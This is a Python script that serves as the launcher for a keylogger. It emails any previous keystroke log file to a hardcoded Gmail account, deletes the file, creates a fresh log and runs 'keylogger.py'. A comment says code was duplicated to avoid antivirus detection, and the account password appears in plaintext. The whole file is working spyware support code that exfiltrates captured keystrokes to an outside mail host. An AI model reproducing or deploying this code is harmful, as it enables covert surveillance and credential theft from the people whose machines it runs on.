import smtplib
from email.message import EmailMessage
from datetime import datetime
import os


#The time_stamp and email_send functions purposly copied from keylogger.py instead of imported so to avoid antivirus interception early in this process.
def time_stamp():
    time_date = datetime.now()
    return time_date.strftime("%H:%M:%S %d/%m/%Y")

def email_send(subject, attachment, count, body):
    email = "keyloggerunsw@gmail.com" #variables for email_send function
    password = "Ilovelogging123$"
    email_char_length = 0
    message = EmailMessage()
    if count == True:
        message['Subject'] = str(str(subject) + ", len = {}".format(email_char_length))
    else:
        message['Subject'] = subject
    message['From'] = email
    message['To'] = email
    message.set_content(body)
    if attachment == True:
        with open("log.txt", "rb") as attachmentfile:
            attachmentfile_body = attachmentfile.read()
            attachmentfile_name = attachmentfile.name
            if count == True:
                email_char_length = len(attachmentfile_body)
        message.add_attachment(attachmentfile_body, maintype='text', subtype='plain', filename=attachmentfile_name)

#send the email
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(email, password)
        smtp.send_message(message)

try:
    with open("log.txt", "r") as old_log:
        print("---Previous log file found!---\n")
        print("---Sending old log to email ... ---\n")
        email_send("Keylogger Startup, Old file = yes, deleting old file", True, True, "See unsent log file from previous keylogger process attached.")
        print("--- ... Email sent!---\n")
        os.remove("log.txt")
        print("---Deleted old log file!---\n")
except FileNotFoundError:
    print("No previous log file found - starting keylogger for first time")
    email_send("Keylogger Startup, Old file = no", False, False, "If no emails come in after this, the computer has either been shutdown immediately after starting or the keylogger file has failed to initialise. Check host computer anti-virus. \n\n {}".format(time_stamp()))

with open("log.txt", "w") as log:
    log.write("--- Log created at: {} --- \n starting keylogger...\n\n----------\n".format(time_stamp()))

#checking if keylogger.py is present. If so, running it:

os.system("python3 keylogger.py")
